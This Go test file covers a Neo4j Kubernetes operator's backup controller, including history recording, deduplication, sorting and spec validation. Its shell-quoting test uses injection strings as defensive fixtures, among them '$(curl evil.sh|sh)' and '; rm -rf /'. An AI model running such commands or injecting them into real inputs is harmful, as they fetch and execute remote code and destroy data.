/*
Copyright 2025.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0
*/

package controller

import (
	"context"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	batchv1 "k8s.io/api/batch/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/runtime"
	"k8s.io/apimachinery/pkg/types"
	clientgoscheme "k8s.io/client-go/kubernetes/scheme"
	"k8s.io/client-go/tools/record"
	ctrl "sigs.k8s.io/controller-runtime"
	"sigs.k8s.io/controller-runtime/pkg/client"
	"sigs.k8s.io/controller-runtime/pkg/client/fake"

	neo4jv1beta1 "github.com/neo4j-partners/neo4j-kubernetes-operator/api/v1beta1"
)

// newBackupTestReconcilerWithStatus wires a Neo4jBackupReconciler against a
// fake client that tracks the status subresource separately. Required for
// any test that exercises r.Status().Update — without WithStatusSubresource,
// fake client silently drops status writes, hiding real behaviour.
func newBackupTestReconcilerWithStatus(t *testing.T, objs ...client.Object) *Neo4jBackupReconciler {
	t.Helper()
	scheme := runtime.NewScheme()
	require.NoError(t, clientgoscheme.AddToScheme(scheme))
	require.NoError(t, neo4jv1beta1.AddToScheme(scheme))
	c := fake.NewClientBuilder().
		WithScheme(scheme).
		WithObjects(objs...).
		WithStatusSubresource(&neo4jv1beta1.Neo4jBackup{}).
		Build()
	return &Neo4jBackupReconciler{
		Client:   c,
		Scheme:   scheme,
		Recorder: record.NewFakeRecorder(16),
	}
}

// Unit tests for the history helpers added in #118. Kept as pure-function
// tests because the end-to-end "Job patched to Succeeded → controller appends
// to status.history" path is hard to drive from envtest: the cluster
// controller running in the same manager flips the target cluster's
// status.phase off Ready before the backup CR's 30s periodic requeue fires,
// leaving the backup reconcile stuck in the "Target cluster is not ready"
// branch (see neo4jbackup_controller.go line ~143).

func TestJobToBackupRun(t *testing.T) {
	start := metav1.NewTime(time.Date(2026, 6, 1, 10, 0, 0, 0, time.UTC))
	end := metav1.NewTime(start.Add(45 * time.Second))

	t.Run("succeeded Job → BackupRun with Duration", func(t *testing.T) {
		job := &batchv1.Job{
			// Under the shared-directory layout (rule 40), Job.Name is
			// per-run unique (CronJob child = "<cronjob>-<unix-seconds>")
			// and identifies the run for log correlation. BackupsPath is
			// the CR-name directory shared by every run of one CR.
			ObjectMeta: metav1.ObjectMeta{
				UID:  types.UID("uid-a"),
				Name: "my-backup-backup-cron-28832400",
			},
			Status: batchv1.JobStatus{
				Succeeded:      1,
				StartTime:      &start,
				CompletionTime: &end,
			},
		}
		run, ok := jobToBackupRun(job, "my-backup")
		if !ok {
			t.Fatalf("expected ok=true for a succeeded Job")
		}
		if run.RunID != "my-backup-backup-cron-28832400" {
			t.Errorf("RunID: got %q, want the Job name %q (issue #158)", run.RunID, "my-backup-backup-cron-28832400")
		}
		if run.Status != "Succeeded" {
			t.Errorf("Status: got %q, want Succeeded", run.Status)
		}
		if run.Stats == nil || run.Stats.Duration != "45s" {
			t.Errorf("Stats.Duration: got %+v, want 45s", run.Stats)
		}
		if run.BackupsPath != "my-backup" {
			t.Errorf("BackupsPath: got %q, want %q (the CR-name shared dir — rule 40)",
				run.BackupsPath, "my-backup")
		}
	})

	t.Run("failed Job → BackupRun without Duration", func(t *testing.T) {
		// Terminal failure = JobFailed CONDITION; the Failed pod counter alone
		// means "still retrying" since the #217 fix (BackoffLimit=3).
		job := &batchv1.Job{
			ObjectMeta: metav1.ObjectMeta{Name: "my-backup-backup"},
			Status: batchv1.JobStatus{
				Failed:     3,
				StartTime:  &start,
				Conditions: []batchv1.JobCondition{{Type: batchv1.JobFailed, Status: "True"}},
			},
		}
		run, ok := jobToBackupRun(job, "my-backup")
		if !ok {
			t.Fatalf("expected ok=true for a failed Job")
		}
		if run.Status != "Failed" {
			t.Errorf("Status: got %q, want Failed", run.Status)
		}
		if run.Stats != nil {
			t.Errorf("Stats should be nil when CompletionTime is missing, got %+v", run.Stats)
		}
	})

	t.Run("still-running Job → ok=false", func(t *testing.T) {
		job := &batchv1.Job{
			ObjectMeta: metav1.ObjectMeta{Name: "my-backup-backup"},
			Status:     batchv1.JobStatus{StartTime: &start},
		}
		if _, ok := jobToBackupRun(job, "my-backup"); ok {
			t.Errorf("expected ok=false for a running Job")
		}
	})
}

func TestBackupRunAlreadyRecorded(t *testing.T) {
	mk := func(uid string) neo4jv1beta1.BackupRun {
		return neo4jv1beta1.BackupRun{RunID: uid}
	}

	cases := []struct {
		name    string
		history []neo4jv1beta1.BackupRun
		run     neo4jv1beta1.BackupRun
		jobUID  string
		want    bool
	}{
		{
			name: "match found",
			history: []neo4jv1beta1.BackupRun{
				mk("a"), mk("b"),
			},
			run:  mk("b"),
			want: true,
		},
		{
			name:    "no match",
			history: []neo4jv1beta1.BackupRun{mk("a")},
			run:     mk("b"),
			want:    false,
		},
		{
			name:    "empty history",
			history: nil,
			run:     mk("a"),
			want:    false,
		},
		{
			name: "incoming run with empty RunID is never a duplicate",
			// Avoids false positives against historic entries pre-upgrade
			// that have RunID="" — those would otherwise all "match" each
			// other and break the append path the first time around.
			history: []neo4jv1beta1.BackupRun{mk(""), mk("a")},
			run:     mk(""),
			want:    false,
		},
		{
			// Upgrade transition: a CronJob child recorded before #158 has a
			// UID-keyed history entry; after upgrade the run is rebuilt with a
			// name-keyed RunID. Matching jobUID recognises the legacy entry so
			// the same Job isn't re-recorded (duplicated).
			name:    "legacy UID-keyed entry matched by jobUID (no re-record on upgrade)",
			history: []neo4jv1beta1.BackupRun{mk("550e8400-e29b-41d4-a716-446655440000")},
			run:     mk("my-backup-cron-1737028800"),
			jobUID:  "550e8400-e29b-41d4-a716-446655440000",
			want:    true,
		},
		{
			// A genuinely new run (different name, different UID) is not a
			// duplicate of the legacy entry.
			name:    "new run with different name and UID is not a duplicate",
			history: []neo4jv1beta1.BackupRun{mk("550e8400-e29b-41d4-a716-446655440000")},
			run:     mk("my-backup-cron-1737099999"),
			jobUID:  "660e8400-e29b-41d4-a716-446655449999",
			want:    false,
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := backupRunAlreadyRecorded(tc.history, tc.run, tc.jobUID)
			if got != tc.want {
				t.Errorf("backupRunAlreadyRecorded() = %v, want %v", got, tc.want)
			}
		})
	}
}

func TestSortBackupRunsNewestFirst(t *testing.T) {
	// Lock in deterministic ordering. SliceStable + StartTime alone is
	// ill-defined when two entries have equal StartTime — possible with
	// CronJob children spawned at the same instant or with zero-StartTime
	// edge-case entries — so cap-at-10 could drop different entries on
	// different reconciles. The RunID tie-breaker makes the order total.
	t0 := metav1.NewTime(time.Date(2026, 6, 1, 10, 0, 0, 0, time.UTC))
	t1 := metav1.NewTime(time.Date(2026, 6, 1, 11, 0, 0, 0, time.UTC))
	t2 := metav1.NewTime(time.Date(2026, 6, 1, 12, 0, 0, 0, time.UTC))

	t.Run("newest StartTime first", func(t *testing.T) {
		runs := []neo4jv1beta1.BackupRun{
			{RunID: "a", StartTime: t0},
			{RunID: "b", StartTime: t2},
			{RunID: "c", StartTime: t1},
		}
		sortBackupRunsNewestFirst(runs)
		assert.Equal(t, []string{"b", "c", "a"}, ids(runs))
	})

	t.Run("equal StartTime → RunID descending", func(t *testing.T) {
		runs := []neo4jv1beta1.BackupRun{
			{RunID: "a", StartTime: t1},
			{RunID: "c", StartTime: t1},
			{RunID: "b", StartTime: t1},
		}
		sortBackupRunsNewestFirst(runs)
		assert.Equal(t, []string{"c", "b", "a"}, ids(runs))
	})

	t.Run("mixed zero and non-zero StartTime", func(t *testing.T) {
		// Zero StartTime sorts to the bottom (correct "newest first"
		// behaviour — entries without timestamps are treated as oldest)
		// and their relative order is RunID-deterministic.
		runs := []neo4jv1beta1.BackupRun{
			{RunID: "zero-x"},
			{RunID: "real-a", StartTime: t0},
			{RunID: "zero-z"},
			{RunID: "real-b", StartTime: t2},
		}
		sortBackupRunsNewestFirst(runs)
		assert.Equal(t, []string{"real-b", "real-a", "zero-z", "zero-x"}, ids(runs))
	})

	t.Run("stable across re-sorts of already-sorted input", func(t *testing.T) {
		// Important: the controller Gets history from the API, appends
		// any new entries at the end, and re-sorts. The sort must be
		// idempotent — sorting an already-sorted slice mustn't change it.
		runs := []neo4jv1beta1.BackupRun{
			{RunID: "c", StartTime: t2},
			{RunID: "b", StartTime: t1},
			{RunID: "a", StartTime: t0},
		}
		want := ids(runs)
		sortBackupRunsNewestFirst(runs)
		assert.Equal(t, want, ids(runs))
	})
}

// ids extracts the RunID slice from a BackupRun slice for cleaner assertions.
func ids(runs []neo4jv1beta1.BackupRun) []string {
	out := make([]string, len(runs))
	for i, r := range runs {
		out[i] = r.RunID
	}
	return out
}

func TestShellQuote(t *testing.T) {
	// Hardening for backup.Spec.Options.AdditionalArgs (issue #117-adjacent).
	// Single-quoted shell strings disable every metacharacter except a single
	// quote, which is escaped by closing → emitting `\'` → reopening.
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"plain flag", "--verbose", "'--verbose'"},
		{"flag with =value", "--include=neo4j", "'--include=neo4j'"},
		{"dollar must not expand", "$HOME", `'$HOME'`},
		{"command substitution backticks", "`whoami`", "'`whoami`'"},
		{"command substitution dollar-paren", "$(curl evil.sh|sh)", `'$(curl evil.sh|sh)'`},
		{"semicolon must not terminate", "; rm -rf /", "'; rm -rf /'"},
		{"single quote inside arg", "a'b", `'a'\''b'`},
		{"empty string", "", "''"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got := shellQuote(tc.in)
			if got != tc.want {
				t.Errorf("shellQuote(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

func TestJobDuration(t *testing.T) {
	// Issue: handleExistingBackupJob used time.Now() captured at reconcile
	// entry, so the metric reported reconcile cost (milliseconds) instead of
	// the actual backup duration. jobDuration derives from Job timestamps so
	// the metric stays accurate regardless of when reconcile observes the Job.
	start := metav1.NewTime(time.Date(2026, 6, 2, 10, 0, 0, 0, time.UTC))
	end := metav1.NewTime(start.Add(2 * time.Minute))

	t.Run("both times present → completion - start", func(t *testing.T) {
		got := jobDuration(&batchv1.Job{
			Status: batchv1.JobStatus{StartTime: &start, CompletionTime: &end},
		})
		assert.Equal(t, 2*time.Minute, got)
	})

	t.Run("only StartTime → since(StartTime)", func(t *testing.T) {
		// Edge case: Failed observed before CompletionTime is written.
		past := metav1.NewTime(time.Now().Add(-90 * time.Second))
		got := jobDuration(&batchv1.Job{
			Status: batchv1.JobStatus{StartTime: &past},
		})
		// Allow generous slack — go test isn't deterministic about clock skew.
		assert.GreaterOrEqual(t, got, 89*time.Second)
		assert.Less(t, got, 95*time.Second)
	})

	t.Run("no StartTime → zero", func(t *testing.T) {
		assert.Equal(t, time.Duration(0), jobDuration(&batchv1.Job{}))
	})

	t.Run("nil Job → zero", func(t *testing.T) {
		assert.Equal(t, time.Duration(0), jobDuration(nil))
	})
}

// Regression for the issue #117-adjacent dedup-path fix: a duplicate call to
// recordOneShotBackupRun must NOT bump resourceVersion (return early) and a
// first-time call must still update Stats and prepend the History entry.
// Previously the diff that introduced dedup left Stats unconditionally
// written before the dedup check; a draft fix would have inverted that and
// silently dropped Stats updates for legitimate first-time calls.
func TestRecordOneShotBackupRunDedup(t *testing.T) {
	ctx := context.Background()
	ns := "default"

	start := metav1.NewTime(time.Date(2026, 6, 2, 10, 0, 0, 0, time.UTC))
	end := metav1.NewTime(start.Add(45 * time.Second))
	// RunID is now the Job name (issue #158), which is the dedup key. jobA
	// and jobB carry distinct names to exercise the dedup function's
	// "different run → new entry" path. (In production the one-shot terminal
	// guard means one CR only ever produces one Job name; this unit test
	// drives the dedup logic directly.)
	jobA := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Name: "b-backup"},
		Status:     batchv1.JobStatus{Succeeded: 1, StartTime: &start, CompletionTime: &end},
	}
	jobB := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{Name: "b-backup-2"},
		Status:     batchv1.JobStatus{Succeeded: 1, StartTime: &start, CompletionTime: &end},
	}
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "b", Namespace: ns},
	}
	// Local helper because newBackupTestReconciler doesn't register
	// Neo4jBackup as having a status subresource — without that,
	// fake-client's Status().Update silently no-ops, masking real behaviour.
	r := newBackupTestReconcilerWithStatus(t, backup)

	get := func() *neo4jv1beta1.Neo4jBackup {
		t.Helper()
		got := &neo4jv1beta1.Neo4jBackup{}
		require.NoError(t, r.Get(ctx, client.ObjectKey{Name: "b", Namespace: ns}, got))
		return got
	}

	t.Run("first call writes Stats and prepends history", func(t *testing.T) {
		r.recordOneShotBackupRun(ctx, backup, jobA)

		got := get()
		require.NotNil(t, got.Status.Stats, "Stats must be set after first call")
		assert.Equal(t, "45s", got.Status.Stats.Duration)
		require.Len(t, got.Status.History, 1)
		assert.Equal(t, "b-backup", got.Status.History[0].RunID)
	})

	t.Run("duplicate call is a no-op (no resourceVersion bump)", func(t *testing.T) {
		before := get()
		rvBefore := before.ResourceVersion

		r.recordOneShotBackupRun(ctx, backup, jobA) // same Job name

		after := get()
		assert.Equal(t, rvBefore, after.ResourceVersion, "duplicate recordOneShotBackupRun must not write")
		require.Len(t, after.Status.History, 1, "history must stay at length 1")
	})

	t.Run("new Job name appends a second history entry", func(t *testing.T) {
		r.recordOneShotBackupRun(ctx, backup, jobB)

		got := get()
		require.Len(t, got.Status.History, 2)
		// Newest first per the prepend convention.
		assert.Equal(t, "b-backup-2", got.Status.History[0].RunID)
		assert.Equal(t, "b-backup", got.Status.History[1].RunID)
	})
}

// TestRecordOneShotBackupRun_FailedJobAppendsToHistory is the
// regression test for recheck gap 2: failed one-shot Jobs used to
// flip status.phase=Failed without appending to status.history, so a
// failure left no durable trace once the Job's TTL elapsed. This test
// pins the new symmetric behavior — the scheduled (CronJob) path was
// already symmetric via reconcileScheduledHistory.
func TestRecordOneShotBackupRun_FailedJobAppendsToHistory(t *testing.T) {
	ctx := context.Background()
	ns := "default"

	start := metav1.NewTime(time.Date(2026, 6, 4, 8, 0, 0, 0, time.UTC))
	failedJob := &batchv1.Job{
		ObjectMeta: metav1.ObjectMeta{
			UID:  types.UID("uid-fail"),
			Name: "my-backup-backup",
		},
		// Terminal failure = JobFailed condition (#217); counter alone = retrying.
		Status: batchv1.JobStatus{
			Failed:     3,
			StartTime:  &start,
			Conditions: []batchv1.JobCondition{{Type: batchv1.JobFailed, Status: "True"}},
		},
	}
	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{Name: "b", Namespace: ns},
	}
	r := newBackupTestReconcilerWithStatus(t, backup)

	r.recordOneShotBackupRun(ctx, backup, failedJob)

	got := &neo4jv1beta1.Neo4jBackup{}
	require.NoError(t, r.Get(ctx, client.ObjectKey{Name: "b", Namespace: ns}, got))
	require.Len(t, got.Status.History, 1,
		"failed one-shot Jobs must be appended to status.history (recheck gap 2)")
	assert.Equal(t, "Failed", got.Status.History[0].Status)
	assert.Equal(t, "my-backup-backup", got.Status.History[0].RunID)
	assert.Equal(t, "b", got.Status.History[0].BackupsPath,
		"BackupsPath must be populated for failed runs too — partial artifacts may exist. "+
			"Value is the CR name (shared-directory layout, rule 40), not the Job name.")
	// status.stats is the "latest succeeded run" summary; a failure must
	// NOT overwrite it. If no prior success exists, it stays nil.
	assert.Nil(t, got.Status.Stats,
		"a failed run must not write to status.stats (Stats is the latest-succeeded summary)")
}

// TestReconcile_RejectsInvalidSpec pins the wired-in spec validation (#159):
// an invalid Neo4jBackup spec is rejected up front in Reconcile via
// validation.NewBackupValidator().Validate, surfaced as phase=Invalid with a
// clear message, and no backing resources are created. Uses a scheduled name
// too long for the generated CronJob ("<name>-backup-cron" > 52 chars) as the
// invalid case. The finalizer is pre-seeded so Reconcile proceeds past the
// finalizer-add step to the validation gate.
func TestReconcile_RejectsInvalidSpec(t *testing.T) {
	ctx := context.Background()
	ns := "default"
	longName := strings.Repeat("a", 41) // "<name>-backup-cron" = 53 chars > 52

	backup := &neo4jv1beta1.Neo4jBackup{
		ObjectMeta: metav1.ObjectMeta{
			Name:       longName,
			Namespace:  ns,
			Finalizers: []string{BackupFinalizer},
		},
		Spec: neo4jv1beta1.Neo4jBackupSpec{
			Target:   neo4jv1beta1.BackupTarget{Kind: "Cluster", Name: "c"},
			Storage:  neo4jv1beta1.StorageLocation{Type: "pvc", PVC: &neo4jv1beta1.PVCSpec{Name: "pvc"}},
			Schedule: "0 2 * * *",
		},
	}
	r := newBackupTestReconcilerWithStatus(t, backup)

	_, err := r.Reconcile(ctx, ctrl.Request{NamespacedName: client.ObjectKey{Name: longName, Namespace: ns}})
	require.NoError(t, err, "invalid spec is a user error, not a reconcile error")

	got := &neo4jv1beta1.Neo4jBackup{}
	require.NoError(t, r.Get(ctx, client.ObjectKey{Name: longName, Namespace: ns}, got))
	assert.Equal(t, "Invalid", got.Status.Phase)
	assert.Contains(t, got.Status.Message, "52-character CronJob")

	// No CronJob should have been created for the invalid spec.
	var cronjobs batchv1.CronJobList
	require.NoError(t, r.List(ctx, &cronjobs, client.InNamespace(ns)))
	assert.Empty(t, cronjobs.Items, "no CronJob should be created when the spec is invalid")
}
